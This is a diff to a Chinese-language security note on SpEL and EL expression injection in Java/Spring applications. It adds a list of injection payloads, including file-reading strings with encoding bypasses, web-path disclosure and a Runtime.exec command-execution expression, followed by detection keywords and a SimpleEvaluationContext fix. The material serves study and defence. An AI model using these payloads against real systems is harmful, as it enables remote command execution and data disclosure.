@@ -241,9 +241,40 @@ T\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.file.F
 T\x00(java.nio.file.Files).readAllLines(T\x00(java.nio.file.Paths).get('d:/logs/test.txt'),T\x00(java.nio.charset.Charset).defaultCharset())
 T%00(java.nio.file.Files).readAllLines(T%00(java.nio.file.Paths).get(%27d:/logs/test.txt%27),T%00(java.nio.charset.Charset).defaultCharset())
 ```
+## 其他的一些payload
+```xml
+${pageContext} // 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）
+${pageContext.getSession().getServletContext().getClassLoader().getResource("")} // 获取web路径
+${header} // 文件头参数
+${applicationScope} // 获取webRoot
+${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("命令").getInputStream())} // 执行命令
+<p th:text="${#this.getClass().forName('java.lang.System').getProperty('user.dir')}"></p>   //获取web路径
+```
+# 检测与防御
+全局搜索关键特征：
+```java
+//关键类
+org.springframework.expression.Expression
+org.springframework.expression.ExpressionParser
+org.springframework.expression.spel.standard.SpelExpressionParser
+//调用特征
+ExpressionParser parser = new SpelExpressionParser();
+Expression expression = parser.parseExpression(str);
+expression.getValue()
+```
+最直接的修复方法是使用SimpleEvaluationContext替换StandardEvaluationContext。
+```java
+String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";
+ExpressionParser parser = new SpelExpressionParser();
+Student student = new Student();
+EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();
+Expression expression = parser.parseExpression(spel);
+System.out.println(expression.getValue(context));
+```
 # 参考
 http://rui0.cn/archives/1043<br>
 https://guokeya.github.io/post/413GsNWtr/<br>
 https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html<br>
 https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/<br>
-https://aluvion.github.io/2019/04/25/Java%E7%89%B9%E8%89%B2-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/
+https://aluvion.github.io/2019/04/25/Java%E7%89%B9%E8%89%B2-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/<br>
+https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html
